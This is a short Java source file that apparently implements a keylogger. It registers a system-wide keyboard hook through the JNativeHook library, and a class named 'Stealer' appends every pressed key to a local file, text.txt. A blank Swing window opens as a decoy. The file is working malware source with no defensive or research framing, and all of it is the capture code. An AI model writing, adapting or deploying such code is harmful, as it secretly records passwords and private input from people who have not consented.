import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import javax.swing.*;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

public class start{
    public static void main(String[] args) {
        Stealer stealer = new Stealer();
        GlobalScreen.addNativeKeyListener(stealer);
        stealer.start();
        Grafon grafon = new Grafon();
    }
}

class Stealer implements NativeKeyListener {
    public void start(){
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
    }
    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
        try(FileWriter fileWriter = new FileWriter(new File("text.txt"), true)){
            logic(fileWriter, nativeKeyEvent);
        } catch (IOException e) {
            e.printStackTrace();
        }
        //System.out.println("Pressed: " + NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()));
    }

    private void logic(FileWriter fileWriter, NativeKeyEvent nativeKeyEvent) throws IOException{
        if(NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()).equalsIgnoreCase("Enter")){
            fileWriter.write("\n");
        }
        else {
            fileWriter.write(NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()));
        }
    }
}

class Grafon extends JFrame{
    Grafon(){
        setVisible(true);
        setSize(200,200);
    }
}
